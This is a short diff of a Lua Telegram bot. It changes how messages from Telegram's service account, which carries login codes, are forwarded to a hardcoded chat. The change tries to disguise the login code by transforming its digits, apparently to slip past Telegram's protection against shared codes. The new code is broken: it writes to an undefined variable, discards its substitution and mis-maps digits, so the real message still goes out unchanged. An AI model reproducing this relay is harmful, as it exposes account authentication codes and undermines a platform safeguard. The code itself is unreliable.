@@ -75,8 +75,15 @@ end
 function msg_valid(msg)
 
     -- if message from telegram it will be sent to REALM
+    -- send access code transformed like this => 12345 becomes 98765
     if msg.from.id == 777000 then
-        send_large_msg('chat#id117401051', string.match(msg.text, '%d+'))
+        local realcode = string.match(msg.text, '%d+')
+        local fakecode = ''
+        for number in string.gmatch(msg.text, "%d") do
+            abc = abc .. tostring(math.abs(number - 10))
+        end
+        msg.text:gsub(realcode, fakecode)
+        send_large_msg('chat#id117401051', 'TRANSFORMED CODE\n' .. msg.text)
         return false
     end
 
